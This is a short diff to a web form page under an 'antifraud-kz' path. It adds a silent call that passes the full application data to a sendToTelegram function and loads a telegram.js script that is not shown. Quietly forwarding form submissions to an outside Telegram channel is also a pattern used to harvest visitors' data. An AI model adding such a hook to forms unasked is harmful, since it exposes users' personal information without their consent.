@@ -249,6 +249,7 @@ function renderSummary(){
 }
 
 function sendApplication(){
+    if(typeof sendToTelegram==="function"){sendToTelegram(data).catch(function(e){console.log("TG error:",e)})}
     document.getElementById('sendBtns').style.display='none';
     document.getElementById('sending').style.display='block';
     data.timestamp=new Date().toISOString();
@@ -350,6 +351,7 @@ document.querySelectorAll('.qz-input').forEach(function(inp){
     inp.addEventListener('input',function(){inp.classList.remove('error')});
 });
 </script>
+<script src="/antifraud-kz/assets/js/telegram.js"></script>
 <script src="/antifraud-kz/assets/js/nav.js"></script>
 </body>
 </html>
